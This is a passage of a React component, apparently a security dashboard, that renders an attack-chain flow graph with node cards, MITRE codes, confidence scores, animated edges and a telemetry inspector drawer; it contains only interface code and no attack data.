        <div className="absolute bottom-4 right-4 z-30 bg-[#0d0e14]/90 p-2 rounded-xl border border-zinc-800 backdrop-blur shadow-xl w-44 h-24 hidden sm:flex flex-col justify-between">
          <div className="flex items-center justify-between text-[9px] font-mono text-zinc-400">
            <span className="flex items-center gap-1">
              <Compass className="w-3 h-3 text-indigo-400" />
              ReactFlow MiniMap
            </span>
            <span>{Math.round(zoomLevel * 100)}%</span>
          </div>

          <div className="relative w-full h-14 bg-[#050608] rounded border border-zinc-800/80 overflow-hidden flex items-center px-1">
            {currentScenario.nodes.map((node, idx) => {
              const isActive = idx === currentStepIndex;
              return (
                <div
                  key={node.id}
                  className={`w-2.5 h-2.5 rounded-full mx-auto transition-all ${
                    isActive ? "bg-indigo-400 ring-2 ring-indigo-400 scale-125 animate-ping" : idx < currentStepIndex ? "bg-emerald-500" : "bg-zinc-700"
                  }`}
                />
              );
            })}
          </div>
        </div>

        {/* Pan-able Canvas Container */}
        <div
          ref={containerRef}
          onMouseDown={handleMouseDown}
          onMouseMove={handleMouseMove}
          onMouseUp={handleMouseUp}
          onMouseLeave={handleMouseUp}
          className="w-full h-full min-h-[520px] cursor-grab active:cursor-grabbing relative transition-transform duration-75"
        >
          <div
            className="absolute inset-0 transition-transform duration-300"
            style={{
              transform: `translate(${panOffset.x}px, ${panOffset.y}px) scale(${zoomLevel})`,
              transformOrigin: "0 0",
            }}
          >
            {/* Bezier Animated SVG Edges Layer */}
            <svg className="absolute inset-0 w-[2400px] h-[600px] pointer-events-none z-10 overflow-visible">
              <defs>
                <style>{`
                  @keyframes kvchEdgeDash {
                    from { stroke-dashoffset: 28; }
                    to { stroke-dashoffset: 0; }
                  }
                  .kvch-animated-edge {
                    animation: kvchEdgeDash 1.2s linear infinite;
                  }
                `}</style>
              </defs>
              {currentScenario.edges.map((edge) => {
                const sourceNode = currentScenario.nodes.find((n) => n.id === edge.source);
                const targetNode = currentScenario.nodes.find((n) => n.id === edge.target);

                if (!sourceNode || !targetNode) return null;

                const startX = sourceNode.x + 230;
                const startY = sourceNode.y + 60;
                const endX = targetNode.x;
                const endY = targetNode.y + 60;

                const controlX1 = startX + 50;
                const controlY1 = startY;
                const controlX2 = endX - 50;
                const controlY2 = endY;

                const isEdgeActive = currentScenario.nodes.findIndex((n) => n.id === targetNode.id) <= currentStepIndex;

                return (
                  <g key={edge.id}>
                    {/* Background path shadow */}
                    <path
                      d={`M ${startX} ${startY} C ${controlX1} ${controlY1}, ${controlX2} ${controlY2}, ${endX} ${endY}`}
                      fill="none"
                      stroke={isEdgeActive ? "#4f46e5" : "#27272a"}
                      strokeWidth={isEdgeActive ? 3 : 1.5}
                      strokeOpacity={isEdgeActive ? 0.8 : 0.4}
                    />

                    {/* Animated packet stream flow */}
                    {isEdgeActive && (
                      <path
                        d={`M ${startX} ${startY} C ${controlX1} ${controlY1}, ${controlX2} ${controlY2}, ${endX} ${endY}`}
                        fill="none"
                        stroke="#818cf8"
                        strokeWidth="3"
                        strokeDasharray="8 6"
                        className="kvch-animated-edge"
                      />
                    )}
                  </g>
                );
              })}
            </svg>

            {/* Custom ReactFlow Nodes Grid */}
            <div className="relative z-20 w-[2400px] h-[520px]">
              {currentScenario.nodes.map((node, idx) => {
                const IconComp = node.icon;
                const isActive = idx === currentStepIndex;
                const isCompleted = idx < currentStepIndex;

                return (
                  <div
                    key={node.id}
                    onClick={() => setInspectNode(node)}
                    style={{ left: `${node.x}px`, top: `${node.y}px` }}
                    className={`reactflow-node-card absolute w-60 rounded-2xl border transition-all duration-300 cursor-pointer overflow-hidden backdrop-blur shadow-2xl ${
                      isActive
                        ? "bg-gradient-to-b from-[#141624] via-[#10121d] to-[#0c0d15] border-indigo-400 ring-4 ring-indigo-500/30 scale-105 shadow-indigo-950/80 z-30"
                        : isCompleted
                        ? "bg-[#0d0e14]/90 border-emerald-500/40 hover:border-emerald-400 z-20"
                        : "bg-[#0b0c10]/70 border-zinc-800/80 opacity-60 hover:opacity-100 hover:border-zinc-700 z-10"
                    }`}
                  >
                    {/* Node Handle Ports */}
                    <div className="absolute top-1/2 -left-2 w-3 h-3 rounded-full bg-indigo-500 border-2 border-black -translate-y-1/2 shadow-md" />
                    <div className="absolute top-1/2 -right-2 w-3 h-3 rounded-full bg-indigo-500 border-2 border-black -translate-y-1/2 shadow-md" />

                    {/* Active Node Pulsing Aura */}
                    {isActive && (
                      <div className="absolute top-0 right-0 w-24 h-24 bg-indigo-500/20 rounded-full blur-2xl pointer-events-none" />
                    )}

                    {/* Node Header */}
                    <div className="bg-[#12141c]/90 px-3.5 py-2.5 border-b border-zinc-800/80 flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <div className={`p-1.5 rounded-lg ${
                          isActive ? "bg-indigo-600 text-white" : isCompleted ? "bg-emerald-950 text-emerald-400" : "bg-zinc-800 text-zinc-400"
                        }`}>
                          <IconComp className="w-3.5 h-3.5" />
                        </div>
                        <span className="text-[11px] font-mono font-bold text-zinc-200 line-clamp-1">
                          {node.subtitle}
                        </span>
                      </div>

                      <span className={`text-[9px] font-mono font-bold px-1.5 py-0.5 rounded uppercase border ${getNodeStatusBadge(node.status)}`}>
                        {node.type}
                      </span>
                    </div>

                    {/* Node Body */}
                    <div className="p-3.5 space-y-2">
                      <h4 className="text-xs font-bold text-white line-clamp-1">{node.title}</h4>
                      <p className="text-[11px] text-zinc-400 line-clamp-2 leading-relaxed font-sans">{node.description}</p>

                      <div className="pt-2 border-t border-zinc-800/60 flex items-center justify-between text-[10px] font-mono text-zinc-400">
                        <span>MITRE: <strong className="text-amber-300">{node.mitreCode}</strong></span>
                        <span>Confidence: <strong className="text-emerald-400">{node.confidenceScore}%</strong></span>
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          </div>
        </div>

      </div>

      {/* Active Node Detail Inspector Box & Control Summary */}
      <div className="bg-[#0e1017] border-t border-zinc-800 p-6 grid grid-cols-1 lg:grid-cols-12 gap-6">
        
        {/* Active Stage Breakdown Card */}
        <div className="lg:col-span-7 bg-[#090a0e] border border-zinc-800 rounded-xl p-4 space-y-3">
          <div className="flex items-center justify-between border-b border-zinc-800 pb-2">
            <span className="text-xs font-mono font-bold uppercase text-indigo-300 flex items-center gap-2">
              <Activity className="w-4 h-4 text-indigo-400" />
              Active Execution Stage: {currentNode.title}
            </span>
            <span className="text-xs font-mono text-emerald-400 bg-emerald-950/40 border border-emerald-800/60 px-2 py-0.5 rounded">
              Status: {currentNode.status}
            </span>
          </div>

          <p className="text-xs text-zinc-300 leading-relaxed font-sans">{currentNode.description}</p>

          <div className="bg-[#050608] p-3 rounded-lg border border-zinc-800/80 font-mono text-xs text-indigo-200">
            <span className="text-zinc-500 block mb-0.5 text-[10px]">Technical Mitigation Action:</span>
            {currentNode.actionTaken}
          </div>
        </div>

        {/* Live Payload JSON Box */}
        <div className="lg:col-span-5 bg-[#090a0e] border border-zinc-800 rounded-xl p-4 flex flex-col justify-between">
          <div className="flex items-center justify-between text-xs font-mono text-zinc-400 mb-2">
            <span className="flex items-center gap-1.5 text-zinc-300 font-semibold">
              <Terminal className="w-3.5 h-3.5 text-indigo-400" />
              Live Telemetry Payload
            </span>
            <span className="text-[10px] text-emerald-400 font-bold">HMAC Verified</span>
          </div>

          <pre className="bg-[#050608] p-3 rounded-lg border border-zinc-800 text-[11px] font-mono text-zinc-300 overflow-x-auto max-h-[110px] leading-relaxed">
            <code>{currentNode.telemetrySnippet}</code>
          </pre>
        </div>

      </div>

      {/* Slide-Over Node Inspect Modal Drawer */}
      {inspectNode && (
        <div className="fixed inset-0 z-50 bg-black/70 backdrop-blur-sm flex justify-end p-4 animate-in fade-in">
          <div className="w-full max-w-lg bg-[#0e1017] border border-zinc-800 rounded-2xl shadow-2xl p-6 flex flex-col justify-between space-y-4">
            
            <div className="space-y-4">
              <div className="flex items-center justify-between border-b border-zinc-800 pb-3">
                <div className="flex items-center gap-2">
                  <div className="p-2 rounded-lg bg-indigo-600 text-white">
                    <Layers className="w-4 h-4" />
                  </div>
                  <div>
                    <h3 className="text-base font-bold text-white">{inspectNode.title}</h3>
                    <span className="text-xs font-mono text-indigo-400">{inspectNode.subtitle}</span>
                  </div>
                </div>

                <button
                  onClick={() => setInspectNode(null)}
                  className="p-1.5 rounded-lg bg-zinc-900 hover:bg-zinc-800 border border-zinc-700 text-zinc-400 hover:text-white transition"
                >
                  <X className="w-4 h-4" />
                </button>
              </div>

              <div className="space-y-3 text-xs">
                <div>
                  <span className="text-zinc-500 block font-mono text-[10px] mb-1">Description:</span>
                  <p className="text-zinc-300 leading-relaxed">{inspectNode.description}</p>
                </div>

                <div className="bg-[#07080a] p-3 rounded-lg border border-zinc-800 font-mono text-[11px]">
                  <span className="text-zinc-500 block mb-1">Technical Execution Detail:</span>
                  <span className="text-indigo-200">{inspectNode.technicalDetail}</span>
                </div>

                <div className="grid grid-cols-2 gap-2 font-mono">
                  <div className="bg-[#07080a] p-2.5 rounded-lg border border-zinc-800">
                    <span className="text-zinc-500 text-[10px] block">MITRE Tactic:</span>
                    <span className="text-amber-300 font-bold">{inspectNode.mitreCode}</span>
                  </div>
                  <div className="bg-[#07080a] p-2.5 rounded-lg border border-zinc-800">
                    <span className="text-zinc-500 text-[10px] block">Confidence Score:</span>
                    <span className="text-emerald-400 font-bold">{inspectNode.confidenceScore}%</span>
                  </div>
                </div>

                <div>
                  <span className="text-zinc-500 block font-mono text-[10px] mb-1">Raw Telemetry Snippet:</span>
                  <pre className="bg-[#050608] p-3 rounded-lg border border-zinc-800 text-[11px] font-mono text-zinc-300 overflow-x-auto max-h-[160px]">
                    <code>{inspectNode.telemetrySnippet}</code>
                  </pre>
                </div>
              </div>
            </div>

            <button
              onClick={() => setInspectNode(null)}
              className="w-full py-2.5 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-semibold text-xs transition shadow-lg shadow-indigo-950"
            >
              Close Inspector Drawer
            </button>

          </div>
        </div>
      )}

    </div>
  );
}
